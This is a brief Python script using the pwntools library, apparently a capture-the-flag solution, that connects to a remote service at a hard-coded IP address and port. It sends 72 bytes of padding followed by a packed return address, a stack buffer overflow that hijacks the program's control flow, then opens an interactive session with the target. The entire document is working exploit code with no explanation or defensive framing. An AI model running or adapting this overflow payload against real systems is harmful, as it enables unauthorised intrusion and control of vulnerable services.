#!/bin/python
from pwn import *

p = remote('34.123.15.202' , 5000)
payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
payload += p64(0x0000000000401136)
p.sendline(payload)
p.interactive()
